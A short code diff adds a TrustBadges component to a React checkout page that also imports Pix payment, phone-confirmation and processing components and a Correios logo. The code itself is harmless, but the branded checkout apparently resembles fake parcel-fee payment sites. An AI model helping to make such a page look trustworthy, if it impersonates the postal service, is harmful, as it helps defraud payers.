@@ -5,6 +5,7 @@ import { OrderSummary } from "@/components/checkout/OrderSummary";
 import { PhoneConfirmModal } from "@/components/checkout/PhoneConfirmModal";
 import { PixPayment } from "@/components/checkout/PixPayment";
 import { ProcessingPayment } from "@/components/checkout/ProcessingPayment";
+import { TrustBadges } from "@/components/checkout/TrustBadges";
 import logo from "@/assets/correios-logo.png";
 
 interface CustomerData {
@@ -121,6 +122,11 @@ const Index = () => {
                 onCancel={() => setShowPhoneModal(false)}
               />
             )}
+
+            {/* Trust Badges at Bottom */}
+            <div className="max-w-6xl mx-auto mt-8">
+              <TrustBadges />
+            </div>
           </div>
         </>
       )}
